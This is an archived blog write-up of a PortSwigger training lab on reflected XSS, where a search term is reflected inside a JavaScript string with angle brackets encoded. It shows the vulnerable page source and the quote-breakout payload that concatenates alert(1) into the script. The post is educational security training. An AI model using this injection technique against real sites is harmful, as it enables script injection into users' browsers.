# Reflected XSS into a JavaScript string with angle brackets HTML encoded

- **Source URL:** https://medium.com/@marduk.i.am/reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded-c9e2ed86f489?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240107060611/https://medium.com/@marduk.i.am/reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded-c9e2ed86f489
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4871 (id 4871)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Reflected XSS into a JavaScript string with angle brackets HTML encoded

--

This is going to be the last in a series of nine, apprentice level, Cross-Site Scripting (XSS) labs from PortSwigger Web Security Academy. In this lab we are going to be revisiting Reflected XSS. Reflected XSS arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

**Lab description:** This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the *alert* function.

It’s a pretty straightforward lab where we are going to need to use the search bar to inject our payload. However, as the lab title indicates, we will not be able to use angle brackets (\<>)within the payload. The angle brackets are encoded this time.

Access the lab and enter an alpha-numeric string in the search bar, that you know will yield 0 results, and hit enter.

Now let’s inspect what is going on with this search function. Right click where your search string is displayed on the results page. Select Inspect.

This is going to bring up your DOM-browser with your search string highlighted. In your DOM search bar, enter your search string again and hit enter. You should have three places where it shows up.

```
<!-- M4rdukWasH3re -->
<section class="blog-header">
    <h1>0 search results for 'M4rdukWasH3re'</h1>
    <hr>
</section>
<script>
    var searchTerms = 'M4rdukWasH3re';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=M4rdukWasH3re">
```
We are going to focus our attention on the \<script>. Notice how our search string is wrapped in single quotes, try adding one single quote to the end of your search string to see what happens. Then right click where your search string is displayed on the results page. Select Inspect.

Look at our search string in the \<script> now. It appears we have broken out. Now all we have to do is add our payload after the single quote.

```
<!-- M4rdukWasH3re' -->
<section class="blog-header">
    <h1>0 search results for 'M4rdukWasH3re''</h1>
    <hr>
</section>
<script>
    var searchTerms = 'M4rdukWasH3re'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
In order to solve the lab, we need to call the alert() function. In previous labs, we had to specify javascript:alert(). This time, however, we are already in a JavaScript script, so we just need to append our alert() function to the existing script.

There is a couple of ways we can do it, I’m going to try to concatenate it to my existing string using the (+) operator:

`M4rdukWasH3re' + alert(1) + '`
Enter your payload into the search bar and hit enter.

Congratulations! You’ve solved another one. Keep up the good work!

Let’s look at what’s happening. Right click where your search string is displayed on the results page. Select Inspect.

Check it out. There is our payload sitting in the \<script>.

```
<!-- M4rdukWasH3re' + alert(1) + ' -->
<section class="blog-header">
    <h1>0 search results for 'M4rdukWasH3re' + alert(1) + ''</h1>
    <hr>
</section>
<script>
    var searchTerms = 'M4rdukWasH3re' + alert(1) + '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=M4rdukWasH3reundefined">
```
**Up Next:**

DOM XSS in document.write sink using source location.search inside a select element

**Previous Labs:**

[Reflected XSS into a JavaScript string with angle brackets HTML encoded](/@marduk.i.am/stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded-1f88ba0b990f)

[Stored XSS into anchor href attribute with double quotes HTML-encoded](/@marduk.i.am/reflected-xss-into-attribute-with-angle-brackets-html-encoded-986d943b3fd2)

[DOM XSS in jQuery selector sink using a hashchange event](/@marduk.i.am/dom-xss-in-jquery-selector-sink-using-a-hashchange-event-bb3c355b3633)

[DOM XSS in jQuery anchor href attribute sink using location.search source](/@marduk.i.am/dom-xss-in-jquery-anchor-href-attribute-sink-using-location-search-source-b1000b4b16b3)

[DOM XSS in innerHTML sink using source location.search](/@marduk.i.am/dom-xss-in-innerhtml-sink-using-source-location-search-a3ac4546ca5c)

[DOM XSS in document.write sink using source location.search](/@marduk.i.am/dom-xss-in-document-write-sink-using-source-location-search-ae458bc5c85f)
